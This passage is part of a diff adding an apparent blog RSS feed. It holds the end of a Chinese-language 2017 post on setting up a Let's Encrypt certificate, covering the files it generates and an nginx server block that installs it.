+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;没有什么错误就会生成如下的几个文件，其中&lt;strong&gt;tiger.chained.crt&lt;/strong&gt;和&lt;strong&gt;tiger.com.key&lt;/strong&gt;就是需要的文件。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;letsencrypt-account.key
+tiger.crt
+tiger.csr
+tiger.chained.crt
+tiger.com.key
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;配置证书安装&quot;&gt;配置证书安装&lt;/h2&gt;
+
+&lt;p&gt;这里使用nginx进行证书安装的服务器&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
+	listen       443;
+	server_name  test.tiger.com;
+
+    ssl on;
+    ssl_certificate tiger.chained.crt;
+    ssl_certificate_key tiger.com.key;
+    ssl_session_timeout 5m;
+
+    location / {
+        root html;
+        index  index.html index.htm;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>  
+               <pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/lets-encrypt-ssl/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/lets-encrypt-ssl/</guid>  
+               </item>  
+          
+    </channel>  
+</rss>
